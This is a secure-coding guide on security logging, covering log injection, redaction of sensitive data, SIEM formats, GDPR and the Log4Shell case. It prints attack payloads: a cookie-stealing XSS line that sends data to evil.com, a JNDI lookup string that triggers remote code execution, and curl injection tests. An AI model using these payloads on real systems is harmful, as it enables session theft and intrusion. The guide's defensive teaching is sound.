# Security Logging & Forensics — Audit Trails, SIEM, Log Injection, GDPR

**CWE:** CWE-778 (Insufficient Logging), CWE-117 (Improper Output Sanitization for Logs), CWE-223 (Omission of Security-relevant Information)
**OWASP Top 10:2021:** A09 — Security Logging and Monitoring Failures
**CWE Top 25 2024:** CWE-778 (#24 Insufficient Logging)

---

## What Is Security Logging?

Security logging is the practice of recording security-relevant events in a system to enable **detection**, **investigation**, and **recovery** from security incidents. Without proper logging, attacks go undetected, forensic analysis is impossible, and compliance requirements (GDPR, SOC 2, PCI DSS, HIPAA) cannot be met.

**The problem:** Most applications log too little (missing critical security events), log incorrectly (no context, no structure), or log dangerously (injectable data, sensitive information).

### What Should Be Logged

| Event Type | Examples | Priority |
|------------|----------|----------|
| **Authentication** | Login success/failure, password changes, MFA events | 🔴 Critical |
| **Authorization** | Access denied, privilege escalation, role changes | 🔴 Critical |
| **Data Access** | Read/write of sensitive data, export operations | 🟠 High |
| **Input Validation** | SQL injection attempts, XSS payloads, invalid input | 🟠 High |
| **Configuration Changes** | Admin settings, firewall rules, user permission changes | 🟠 High |
| **System Events** | Service restarts, errors, crashes, resource exhaustion | 🟡 Medium |
| **API Calls** | Endpoint access, rate limiting, unusual patterns | 🟡 Medium |
| **Network Events** | Connection attempts, DNS lookups, proxy decisions | 🟡 Medium |

---

## Why Vibe Coding Makes This Worse

- **AI doesn't add logging unless told** — Logging is "non-functional overhead" that AI skips.
- **AI logs sensitive data** — Passwords, tokens, PII end up in logs because AI doesn't audit log content.
- **AI produces unstructured logs** — Raw strings without standardized format (JSON/CEF/LEEF).
- **AI doesn't handle log injection** — User input is concatenated into log strings unsanitized.
- **AI ignores SIEM integration** — Logs written to stdout only, no centralized collection.

---

## Vulnerability Categories

### 1. Insufficient Logging (CWE-778)

The most common security logging failure is simply **not logging enough**. Without records of authentication attempts, access denials, and configuration changes, attackers operate invisibly.

**Vulnerable Pattern — Missing Logs:**
```javascript
// 🔴 VULNERABLE: Authentication failure logged as generic "info"
app.post('/login', async (req, res) => {
    const user = await db.users.findByEmail(req.body.email);
    if (!user || !bcrypt.compare(req.body.password, user.passwordHash)) {
        // Just returns 401 — NO LOG OF FAILED ATTEMPT
        return res.status(401).send('Invalid credentials');
    }
    req.session.userId = user.id;
    res.send('Logged in');
});
```

**Fixed Pattern — Structured Security Logging:**
```javascript
// ✅ SAFE: Structured, contextual security logging
const { createLogger, format, transports } = require('winston');

const auditLogger = createLogger({
    level: 'info',
    format: format.combine(
        format.timestamp(),
        format.json()
    ),
    defaultMeta: { service: 'auth-service' },
    transports: [new transports.File({ filename: 'audit.log' })]
});

app.post('/login', async (req, res) => {
    const startTime = Date.now();
    const ip = req.ip;
    const userAgent = req.get('User-Agent');
    
    const user = await db.users.findByEmail(req.body.email);
    const success = !!(user && bcrypt.compare(req.body.password, user.passwordHash));
    
    if (success) {
        req.session.userId = user.id;
        auditLogger.info('LOGIN_SUCCESS', {
            userId: user.id,
            email: user.email,
            ip,
            userAgent,
            responseTime: Date.now() - startTime
        });
    } else {
        auditLogger.warn('LOGIN_FAILURE', {
            attemptedEmail: req.body.email,
            ip,
            userAgent,
            reason: user ? 'invalid_password' : 'user_not_found'
        });
        return res.status(401).send('Invalid credentials');
    }
    res.send('Logged in');
});
```

---

### 2. Log Injection / Log Forging (CWE-117)

Log injection occurs when untrusted user input is written to logs without sanitization. An attacker can:

- **Forge fake log entries** to cover tracks
- **Corrupt log parsers** that read field-delimited logs
- **Inject CRLF sequences** to create misleading log records
- **Exploit log viewer XSS** by injecting `<script>` tags into web-based log viewers

**Vulnerable Code — Log Injection:**
```python
import logging

@app.route('/transfer')
def transfer():
    amount = request.args.get('amount')
    to_account = request.args.get('to')
    
    # 🔴 VULNERABLE: User input directly in log
    logging.info(f"Transfer ${amount} to account {to_account}")
    # Attacker can inject:
    # ?amount=100&to=12345\n2023-01-01 INFO Transfer $1000000 to account 99999
    # This creates a fake log entry!
```

**Attack Payloads for Log Injection:**
```
# CRLF Injection — creates fake log entries
?user=admin\r\n2023-01-01 INFO [AUDIT] User admin transferred $1000000

# Newline Injection — breaks log format
?user=admin%0a2024-01-01%20WARN%20[AUDIT]%20Access%20granted%20to%20admin

# Tab Injection — corrupts TSV/CSV log parsers
?user=admin\tGRANTED\troot

# XSS in Web Log Viewer
?user=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

**Fixed Code — Log Sanitization:**
```python
import logging
import re

def sanitize_log(value):
    """Remove or escape characters that could corrupt logs or enable injection."""
    if not isinstance(value, str):
        value = str(value)
    # Remove CR, LF, and tab characters
    value = re.sub(r'[\r\n\t]', '_', value)
    # Truncate to reasonable length
    return value[:200]

@app.route('/transfer')
def transfer():
    amount = sanitize_log(request.args.get('amount', ''))
    to_account = sanitize_log(request.args.get('to', ''))
    
    # ✅ SAFE: Sanitized input for logs
    logging.info(f"Transfer ${amount} to account {to_account}")
```

---

### 3. Sensitive Data in Logs

Logging sensitive information is one of the most common data breaches. PII, passwords, tokens, credit card numbers, and session IDs frequently appear in logs.

**Vulnerable Patterns:**
```javascript
// 🔴 VULNERABLE: Logging entire request body
app.use((req, res, next) => {
    console.log('Request:', req.method, req.url, req.body);  // Contains passwords!
    next();
});

// 🔴 VULNERABLE: Logging error with full context
try {
    await processPayment(req.body);
} catch (err) {
    console.error('Payment failed:', err, req.body);  // CC numbers in logs!
}

// 🔴 VULNERABLE: Logging token responses
const tokenResponse = await fetch('/token', { ... });
console.log('Token response:', await tokenResponse.json());  // Tokens logged!
```

**Fixed — Redacting Sensitive Data:**
```javascript
const SENSITIVE_FIELDS = ['password', 'secret', 'token', 'credit_card', 'ssn', 'authorization'];

function sanitizeObject(obj) {
    if (!obj || typeof obj !== 'object') return obj;
    const sanitized = { ...obj };
    for (const key of Object.keys(sanitized)) {
        if (SENSITIVE_FIELDS.some(f => key.toLowerCase().includes(f))) {
            sanitized[key] = '[REDACTED]';
        } else if (typeof sanitized[key] === 'object') {
            sanitized[key] = sanitizeObject(sanitized[key]);
        }
    }
    return sanitized;
}

// ✅ SAFE: Redact before logging
app.use((req, res, next) => {
    const safeBody = sanitizeObject(req.body);
    console.log('Request:', req.method, req.url, safeBody);
    next();
});
```

---

### 4. SIEM Integration Failures

SIEM (Security Information and Event Management) systems aggregate logs from multiple sources for centralized monitoring. Common failures:

| Failure | Impact |
|---------|--------|
| **No structured format** | SIEM cannot parse plain text logs |
| **Missing timestamps** | Events cannot be correlated in time |
| **Clock skew** | Events from different sources have misaligned timestamps |
| **Incomplete coverage** | Critical systems not sending logs to SIEM |
| **No log rotation** | Disk fills, logs stop being written |
| **No WORM storage** | Attacker deletes logs to cover tracks |

**Structured Log Format (JSON — SIEM-Ready):**
```json
{
    "timestamp": "2024-01-15T10:30:00.123Z",
    "event": "LOGIN_FAILURE",
    "severity": "WARN",
    "source": {
        "ip": "192.168.1.100",
        "userAgent": "Mozilla/5.0...",
        "sessionId": "abc123"
    },
    "target": {
        "userId": null,
        "attemptedEmail": "user@example.com"
    },
    "error": {
        "code": "AUTH-001",
        "message": "Invalid password"
    },
    "correlationId": "req-456-def",
    "environment": "production"
}
```

**CEF (Common Event Format):**
```
CEF:0|MyApp|AuthService|1.0|LOGIN_FAILURE|Authentication Failed|5|
src=192.168.1.100 suser=user@example.com msg=Invalid password rt=Jan 15 2024 10:30:00
```

---

### 5. GDPR & Compliance Requirements

GDPR imposes strict requirements on logging and data retention:

| Requirement | Implication |
|-------------|-------------|
| **Data minimization** | Only log PII essential for security purposes |
| **Right to erasure** | Must be able to delete user's data from logs |
| **Purpose limitation** | Logs cannot be used for purposes beyond security |
| **72-hour breach notification** | Inadequate logs → cannot detect breach in time → fine |
| **Data retention limits** | Logs must be deleted after defined period |
| **Data processing record** | Must log all processing of personal data |

**GDPR-Compliant Logging Implementation:**
```javascript
class GDRPLogger {
    constructor() {
        this.retentionDays = 90;
        this.piiFields = ['email', 'ip', 'username', 'phone'];
    }

    log(event, data = {}) {
        // Pseudonymize PII before logging
        const safeData = this.pseudonymize(data);
        safeData.timestamp = new Date().toISOString();
        safeData.event = event;
        
        // Store with TTL for automatic deletion
        this.storeWithTTL(safeData, this.retentionDays);
    }

    pseudonymize(data) {
        const safe = { ...data };
        if (safe.email) safe.email = this.hashEmail(safe.email);
        if (safe.ip) safe.ip = this.anonymizeIP(safe.ip);
        if (safe.username) safe.username = undefined; // Don't log usernames
        return safe;
    }

    hashEmail(email) {
        return crypto.createHash('sha256').update(email + APP_SALT).digest('hex').slice(0, 16);
    }

    anonymizeIP(ip) {
        // Remove last octet for IPv4
        return ip.replace(/\.\d+$/, '.0');
    }

    storeWithTTL(data, days) {
        // Implementation would write to DB with TTL index
        console.log(JSON.stringify(data));
    }

    // GDPR: Right to erasure
    async deleteUserData(userId) {
        await db.collection('audit_logs').deleteMany({ userId });
        // Or: mark logs with retention expiry
    }
}
```

---

## Prevention Checklist

```
✅ LOGGING & FORENSICS CHECKLIST:
- Log ALL authentication events (login success, failure, logout, password reset)
- Log authorization failures (403 responses, ACL violations)
- Log configuration changes, privilege escalations, and admin actions
- Use structured log format (JSON, CEF, LEEF) — never plain text
- Sanitize/redact user input before writing to logs
- NEVER log passwords, tokens, secrets, or PII
- Set appropriate log levels: DEBUG=dev, INFO=normal, WARN=suspicious, ERROR=failures
- Implement log rotation and retention policies
- Use centralized logging (SIEM/SOAR) with WORM storage
- Synchronize clocks across all systems (NTP)
- Include correlation IDs to trace requests across services
- Implement audit trails for sensitive data access (who, what, when, why)
- Test your logging — simulate attacks and verify detection
- Follow GDPR: pseudonymize PII, support erasure, enforce retention limits
- Implement alerting on critical events (not just logging)
```

---

## Real-World CVEs & Incidents

| Vulnerability | CVE / Incident | Impact |
|---------------|---------------|--------|
| **Log4Shell — RCE via Log Input** | CVE-2021-44228 | CRITICAL RCE in 93% of enterprise cloud environments, exploited within hours |
| **Log4j 2.15.0 Incomplete Fix** | CVE-2021-45046 | DoS and continued RCE risk in non-default configurations |
| **Log4j Denial of Service** | CVE-2021-45105 | Uncontrolled recursion in Log4j 2.x pattern layout |
| **SolarWinds Orion Log Tampering** | SUNBURST 2020 | Attackers deleted/modified logs to hide backdoor activity |
| **Capital One — Missing Logs** | 2019 Breach | Insufficient CloudTrail logging delayed breach detection by 4 months |
| **Twitter Logging Passwords in Plaintext** | 2018 | Internal log exposed plaintext passwords to employees |
| **Equifax — Failed Log Monitoring** | CVE-2017-5638 | Apache Struts exploit went undetected for 76 days due to inadequate logging |

### Case Study 1: Log4Shell (CVE-2021-44228) — RCE via Logging

The most severe logging vulnerability in history. Apache Log4j 2.x (the most widely used Java logging library) performed **JNDI lookups** on log messages containing `${jndi:ldap://...}` patterns. An attacker who could control any log message or parameter could trigger **remote code execution**.

**Impact:**
- 93% of enterprise cloud environments affected
- Exploited within hours of disclosure
- Hundreds of millions of exploit attempts in first week
- Affected Minecraft, iCloud, Steam, and thousands of enterprise apps

**The vulnerability:**
```java
// 🔴 VULNERABLE: Log4j 2.0 - 2.14.1
logger.info("User logged in from: {}", userInput);
// If userInput = "${jndi:ldap://evil.com/a}"
// Log4j performs JNDI lookup → LDAP returns malicious class → RCE!

// Fixed in 2.17.0: JNDI lookups disabled by default,
// message lookups disabled, LDAP deserialization restricted
```

**Source:** https://nvd.nist.gov/vuln/detail/CVE-2021-44228

### Case Study 2: Twitter Password Logging Incident (2018)

Twitter disclosed that a bug caused **plaintext passwords** to be written to internal logs before being hashed. The passwords were stored in readable form in an internal log repository.

**Root cause:** The logging framework wrote the password parameter into log statements during registration, before bcrypt hashing completed.

**Consequences:**
- Twitter recommended all 330M users change their passwords
- Internal investigation found no evidence of breach
- Regulatory scrutiny and reputational damage

**Source:** https://blog.twitter.com/en_us/topics/company/2018/keeping-your-account-secure

### Case Study 3: SolarWinds SUNBURST — Log Tampering (2020)

The SolarWinds Orion supply chain attack involved sophisticated log manipulation to evade detection. The SUNBURST backdoor:

1. **Slept for 12-14 days** before activating (evading sandbox analysis)
2. **Deleted install logs** to remove evidence of compromise
3. **Falsified telemetry data** to appear as normal system activity
4. **Modified Windows event logs** selectively to hide lateral movement

This demonstrated that attackers will actively tamper with logs once they gain access, reinforcing the need for **WORM (Write Once, Read Many) storage** and **cryptographic log integrity verification**.

**Source:** https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a

---

## Testing Your Logging

**Inject test payloads:**
```bash
# Log injection test
curl "https://app.com/login?user=%0a2024-01-01%20CRITICAL%20Access%20granted%20to%20admin"

# XSS in log viewer
curl "https://app.com/search?q=<script>alert(1)</script>"

# Sensitive data leak check
curl "https://app.com/api/error" -H "Authorization: Bearer test_token_12345"
```

**Verify log completeness:**
```bash
# Trigger various events and check logs
curl -X POST "https://app.com/login" -d "email=test&password=wrong"  # Should appear
curl "https://app.com/admin/config"  # Should log auth failure
curl "https://app.com/api/users/export"  # Should log sensitive data access
```

---

## References

- [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)
- [OWASP A09:2021 — Security Logging and Monitoring Failures](https://owasp.org/Top10/2021/A09_2021-Security_Logging_and_Monitoring_Failures/)
- [CWE-117: Improper Output Sanitization for Logs](https://cwe.mitre.org/data/definitions/117.html)
- [CWE-778: Insufficient Logging](https://cwe.mitre.org/data/definitions/778.html)
- [CAPEC-93: Log Injection-Tampering-Forging](https://capec.mitre.org/data/definitions/93.html)
- [NIST SP 800-92 — Log Management Guide](https://csrc.nist.gov/publications/detail/sp/800-92/rev-1/draft)
- [GDPR Article 30 — Records of Processing Activities](https://gdpr-info.eu/art-30-gdpr/)
- [CVE-2021-44228 — Apache Log4j](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [PCI DSS v4.0 — Logging Requirements (Req 10)](https://listings.pcisecuritystandards.org/documents/PCI-DSS-v4_0.pdf)
